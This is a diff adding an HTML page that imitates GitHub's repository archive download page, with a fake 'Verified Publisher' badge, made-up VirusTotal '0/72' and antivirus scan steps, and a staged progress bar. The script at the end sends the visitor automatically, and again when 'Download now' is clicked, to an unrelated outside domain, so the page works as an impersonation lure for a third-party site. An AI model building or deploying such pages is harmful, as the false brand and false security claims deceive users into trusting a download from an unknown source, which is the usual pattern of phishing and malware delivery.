@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Preparing archive for octocat/hello-world.zip · GitHub</title>
+  <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="https://github.githubassets.com/favicons/favicon.ico">
+
+  <style>
+    :root { color-scheme: light dark; }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    header {
+      background: #010409;
+      border-bottom: 1px solid #21262d;
+      padding: 12px 16px;
+    }
+    .header-inner {
+      max-width: 1280px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      color: #f0f6fc;
+      font-size: 24px;
+      font-weight: 600;
+      text-decoration: none;
+    }
+    .logo svg { fill: currentColor; width: 32px; height: 32px; margin-right: 8px; }
+    .nav a {
+      color: #f0f6fc;
+      margin-left: 24px;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 14px;
+    }
+    .nav a:hover { color: #58a6ff; text-decoration: underline; }
+
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 20px 80px;
+    }
+    .card {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      width: 100%;
+      max-width: 620px;
+      overflow: hidden;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+      opacity: 0;
+      transform: translateY(16px);
+      transition: all 0.7s ease;
+      min-height: 620px;
+    }
+    .card.visible { opacity: 1; transform: translateY(0); }
+    .card.expanded { min-height: 820px; transition: min-height 1s ease-out; }
+
+    .card-header {
+      background: #0d1117;
+      padding: 14px 24px;
+      border-bottom: 1px solid #21262d;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #444c56, #30363d);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      font-weight: bold;
+      color: #8b949e;
+    }
+    .repo-info { flex: 1; }
+    .repo-name { font-size: 18px; font-weight: 600; margin: 0; }
+    .repo-meta { font-size: 12px; color: #8b949e; margin-top: 2px; }
+    .verified-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      color: #3fb950;
+      background: rgba(63,185,80,0.12);
+      padding: 4px 10px;
+      border-radius: 12px;
+      border: 1px solid rgba(63,185,80,0.3);
+    }
+
+    .card-body {
+      padding: 24px 32px 20px;
+      text-align: center;
+    }
+    h1 { font-size: 26px; margin: 0 0 6px; letter-spacing: -0.2px; }
+    .generating-note { color: #8b949e; font-size: 14px; margin-bottom: 16px; }
+    .secure-info { font-size: 12px; color: #3fb950; margin-bottom: 24px; font-weight: 500; }
+
+    .scan-log {
+      text-align: left;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 16px 18px;
+      margin: 0 0 28px;
+      font-family: "SF Mono", Monaco, monospace;
+      font-size: 13.5px;
+      line-height: 1.65;
+    }
+    .scan-step {
+      display: flex;
+      align-items: center;
+      margin: 5px 0;
+      opacity: 0;
+      transform: translateY(5px);
+      transition: all 0.4s ease;
+    }
+    .scan-step.show { opacity: 1; transform: translateY(0); }
+    .scan-step .check {
+      color: #3fb950;
+      margin-right: 10px;
+      font-weight: bold;
+      opacity: 0;
+      min-width: 16px;
+      font-size: 15px;
+    }
+    .scan-step.done .check { opacity: 1; }
+
+    .progress-area { margin: 28px 0 36px; }
+    .phase-label { font-size: 15px; color: #8b949e; margin-bottom: 8px; font-weight: 500; }
+    .time-left { font-size: 21px; font-weight: 600; color: #58a6ff; margin-bottom: 10px; }
+    .progress-bar { height: 9px; background: #21262d; border-radius: 5px; overflow: hidden; }
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #238636, #2ea043, #3fb950);
+      transition: width 0.55s ease-out;
+    }
+
+    /* Контейнер, где будет либо вес файла, либо кнопка */
+    .progress-bottom {
+      height: 24px; /* фиксированная высота, чтобы не прыгало */
+      margin-top: 8px;
+      transition: all 0.6s ease;
+      position: relative;
+    }
+
+    .bytes-info,
+    .download-wrapper {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.6s ease, transform 0.6s ease;
+    }
+
+    .bytes-info {
+      opacity: 1;
+      transform: translateY(0);
+      font-size: 13px;
+      color: #8b949e;
+    }
+
+    .download-wrapper {
+      opacity: 0;
+      transform: translateY(10px);
+    }
+
+    .download-btn {
+      padding: 10px 32px;
+      font-size: 15px;
+      font-weight: 500;
+      background: #238636;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .download-btn:hover {
+      background: #2ea043;
+    }
+
+    .status-block {
+      margin-top: 32px;
+      padding-top: 24px;
+      border-top: 1px solid #21262d;
+      min-height: 140px;
+      transition: min-height 0.9s ease;
+      position: relative;
+    }
+
+    .status-message,
+    .success-content {
+      position: absolute;
+      inset: 0;
+      transition: all 0.8s ease;
+    }
+
+    .status-message { opacity: 1; }
+    .success-content { opacity: 0; pointer-events: none; }
+
+    .status-title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #58a6ff;
+      margin-bottom: 8px;
+    }
+    .status-subtitle {
+      font-size: 15px;
+      color: #8b949e;
+      margin-bottom: 12px;
+    }
+    .status-info {
+      font-size: 13.5px;
+      color: #8b949e;
+      line-height: 1.5;
+    }
+
+    .success-title {
+      font-size: 32px;
+      color: #3fb950;
+      margin: 0 0 16px;
+      font-weight: 700;
+    }
+    .badges {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      justify-content: center;
+      margin: 16px 0 24px;
+    }
+    .badge {
+      background: linear-gradient(135deg, rgba(63,185,80,0.15), rgba(63,185,80,0.05));
+      border: 1px solid rgba(63,185,80,0.45);
+      color: #d0f0c0;
+      padding: 9px 20px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 14.5px;
+      box-shadow: 0 2px 8px rgba(63,185,80,0.12);
+    }
+
+    .redirect-info {
+      font-size: 16px;
+      margin: 20px 0 24px;
+      color: #8b949e;
+    }
+
+    .prank-notice {
+      margin: 32px auto 0;
+      max-width: 520px;
+      padding: 14px 22px;
+      background: rgba(255, 193, 7, 0.09);
+      border: 1px solid rgba(255, 193, 7, 0.28);
+      border-radius: 8px;
+      font-size: 13.5px;
+      color: #ffecb3;
+      line-height: 1.55;
+      opacity: 0;
+      transform: translateY(12px);
+      transition: all 0.7s ease-out 0.5s;
+    }
+    .prank-notice.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    footer {
+      background: #010409;
+      border-top: 1px solid #21262d;
+      padding: 36px 16px 48px;
+      color: #8b949e;
+      font-size: 12px;
+      flex-shrink: 0;
+    }
+    .footer-inner {
+      max-width: 1280px;
+      margin: 0 auto;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+    }
+    .footer-links a {
+      color: #8b949e;
+      text-decoration: none;
+      margin-left: 16px;
+    }
+    .footer-links a:hover { color: #58a6ff; text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <a href="#" class="logo">
+      <svg height="32" viewBox="0 0 16 16" width="32"><path fill-rule="evenodd" d="M8 0.198a8 8 0 0 0-2.528 15.597c0.4 0.074 0.547-0.174 0.547-0.386 0-0.19-0.007-0.693-0.011-1.36-2.226 0.483-2.695-1.073-2.695-1.073-0.364-0.924-0.89-1.17-0.89-1.17-0.727-0.497 0.055-0.487 0.055-0.487 0.804 0.057 1.227 0.826 1.227 0.826 0.714 1.223 1.873 0.87 2.33 0.665 0.072-0.517 0.279-0.87 0.508-1.07-1.777-0.202-3.644-0.888-3.644-3.954 0-0.873 0.312-1.587 0.824-2.147-0.083-0.202-0.357-1.017 0.078-2.12 0 0 0.671-0.215 2.2 0.82a7.673 7.673 0 0 1 2.004-0.27c0.68 0.003 1.366 0.092 2.004 0.27 1.528-1.035 2.198-0.82 2.198-0.82 0.437 1.103 0.163 1.918 0.08 2.12 0.513 0.56 0.823 1.274 0.823 2.147 0 3.074-1.87 3.75-3.652 3.948 0.287 0.247 0.543 0.735 0.543 1.482 0 1.07-0.01 1.933-0.01 2.196 0 0.214 0.145 0.463 0.55 0.384A8.001 8.001 0 0 0 8 0.198z"></path></svg>
+      GitHub
+    </a>
+    <div class="nav">
+      <a href="#">Features</a>
+      <a href="#">Security</a>
+      <a href="#">Enterprise</a>
+      <a href="#">Explore</a>
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="card" id="card">
+
+    <div class="card-header">
+      <div class="avatar">G</div>
+      <div class="repo-info">
+        <div class="repo-name">gitcompiler / hello-world</div>
+        <div class="repo-meta">Branch: main · <span id="phase">Preparing archive…</span></div>
+      </div>
+      <div class="verified-badge">
+        <span>Verified Publisher</span>
+        <span style="color:#3fb950; font-size:11px;">✓</span>
+      </div>
+    </div>
+
+    <div class="card-body">
+
+      <h1>Preparing your download…</h1>
+      <div class="generating-note">GitHub is generating this archive for you</div>
+      <div class="secure-info">HTTPS • Secure connection</div>
+
+      <div class="scan-log" id="scan-log">
+        <div class="scan-step" id="step-1"><span class="check">✔</span> Verifying file integrity…</div>
+        <div class="scan-step" id="step-2"><span class="check">✔</span> VirusTotal scan (0/72 engines)…</div>
+        <div class="scan-step" id="step-3"><span class="check">✔</span> Heuristic analysis…</div>
+        <div class="scan-step" id="step-4"><span class="check">✔</span> Entropy & packer detection…</div>
+        <div class="scan-step" id="step-5"><span class="check">✔</span> Signature database check…</div>
+        <div class="scan-step" id="step-6"><span class="check">✔</span> YARA rule matching…</div>
+        <div class="scan-step" id="step-7"><span class="check">✔</span> Zero-day behavior analysis…</div>
+      </div>
+
+      <div class="progress-area">
+        <div class="phase-label" id="current-phase">Collecting files…</div>
+        <div class="time-left" id="time-left">~11s</div>
+        <div class="progress-bar">
+          <div class="progress-fill" id="progress-fill"></div>
+        </div>
+
+
+        <div class="progress-bottom" id="progress-bottom">
+          <div class="bytes-info" id="bytes-info"></div>
+          <div class="download-wrapper" id="download-wrapper">
+            <button id="download-now" class="download-btn">Download now</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="status-block" id="status-block">
+        <div class="status-message" id="status-message">
+          <div class="status-title">Generating archive…</div>
+          <div class="status-subtitle">Creating a .zip file of the repository</div>
+          <div class="status-info">
+            This process usually takes 5–20 seconds depending on repository size. Large repositories or those with many binary files can take longer to compress.
+          </div>
+        </div>
+
+        <div class="success-content" id="success-content">
+          <div class="success-title">All security checks passed ✓</div>
+          <div class="badges">
+            <div class="badge">VirusTotal Certified — 0/72</div>
+            <div class="badge">Antivirus Protected</div>
+            <div class="badge">Zero-day Clean</div>
+          </div>
+
+        </div>
+      </div>
+
+      <div class="prank-notice" id="prank-notice">
+        Having trouble? Try downloading again or use a different browser.<br>
+        Please keep this page open while we prepare your archive.
+      </div>
+
+    </div>
+
+  </div>
+</main>
+
+<footer>
+  <div class="footer-inner">
+    <div>© 2026 GitHub, Inc.</div>
+    <div class="footer-links">
+      <a href="#">Terms</a>
+      <a href="#">Privacy</a>
+      <a href="#">Security</a>
+      <a href="#">Status</a>
+      <a href="#">Docs</a>
+      <a href="#">Blog</a>
+      <a href="#">About</a>
+      <a href="#">Shop</a>
+      <a href="#">Contact GitHub</a>
+      <a href="#">Pricing</a>
+      <a href="#">API</a>
+      <a href="#">Training</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+const REDIRECT_URL = "https://mcglynger.com/";
+
+const card           = document.getElementById('card');
+const phaseEl        = document.getElementById('current-phase');
+const timeLeftEl     = document.getElementById('time-left');
+const progressFill   = document.getElementById('progress-fill');
+const bytesInfo      = document.getElementById('bytes-info');
+const downloadWrapper = document.getElementById('download-wrapper');
+const statusMessage  = document.getElementById('status-message');
+const successContent = document.getElementById('success-content');
+const downloadBtn    = document.getElementById('download-now');
+const prankNotice    = document.getElementById('prank-notice');
+
+const TOTAL_TIME = 9800;
+const RESULT_SHOW = 7200;
+const REDIRECT_DELAY = 3800;
+
+let start = Date.now();
+
+setTimeout(() => {
+  card.classList.add('visible');
+  prankNotice.classList.add('visible');
+}, 500);
+
+const phases = [
+  { text: "Collecting files…",           startPct: 0,   endPct: 22 },
+  { text: "Compressing archive…",        startPct: 22,  endPct: 48 },
+  { text: "Running security checks…",    startPct: 48,  endPct: 78 },
+  { text: "Finalizing download…",        startPct: 78,  endPct: 100 }
+];
+
+const steps = Array.from(document.querySelectorAll('.scan-step'));
+
+function animateSteps() {
+  let i = 0;
+  const iv = setInterval(() => {
+    if (i < steps.length) {
+      steps[i].classList.add('show', 'done');
+      i++;
+    } else clearInterval(iv);
+  }, 780);
+}
+
+function update() {
+  const elapsed = Date.now() - start;
+  let pct = Math.min(100, (elapsed / TOTAL_TIME) * 100);
+  progressFill.style.width = pct + '%';
+
+  if (pct > 25 && pct < 32) pct = Math.min(31, pct + Math.sin(elapsed/280)*2.5);
+  if (pct > 58 && pct < 66) pct = Math.min(65, pct + Math.sin(elapsed/380)*3);
+
+  const current = phases.find(p => pct >= p.startPct && pct < p.endPct) || phases[phases.length-1];
+  phaseEl.textContent = current.text;
+
+  if (pct > 12) {
+    const total = 40;
+    const curr = (pct / 100 * total).toFixed(1);
+    bytesInfo.textContent = `${curr} MB / ${total}.0 MB • ${Math.round(pct)}%`;
+  }
+
+  const rem = Math.max(1, Math.ceil((TOTAL_TIME - elapsed) / 1000));
+  timeLeftEl.textContent = `~${rem}s`;
+
+  if (elapsed >= RESULT_SHOW) {
+    statusMessage.style.opacity = '0';
+    statusMessage.style.transform = 'translateY(-10px)';
+
+    setTimeout(() => {
+      successContent.style.opacity = '1';
+      successContent.style.transform = 'translateY(0)';
+      card.classList.add('expanded');
+
+      
+      bytesInfo.style.opacity = '0';
+      bytesInfo.style.transform = 'translateY(-10px)';
+      downloadWrapper.style.opacity = '1';
+      downloadWrapper.style.transform = 'translateY(0)';
+
+      
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, REDIRECT_DELAY);
+    }, 500);
+  }
+
+  requestAnimationFrame(update);
+}
+
+
+downloadBtn.addEventListener('click', () => {
+  window.location.href = REDIRECT_URL;
+});
+
+animateSteps();
+update();
+</script>
+</body>
+</html>
